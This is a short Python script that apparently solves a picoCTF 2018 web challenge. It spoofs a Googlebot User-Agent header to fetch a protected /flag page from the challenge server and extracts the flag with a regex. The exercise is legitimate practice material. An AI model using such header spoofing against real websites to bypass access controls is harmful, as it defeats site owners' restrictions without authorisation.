#!/usr/bin/env python


import re
import requests

url = 'http://2018shell.picoctf.com:53383/flag'
userheaders = {'User-Agent': 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36'}

r = requests.get(url, headers=userheaders)

print re.findall('picoCTF{.*}',r.text)[0]
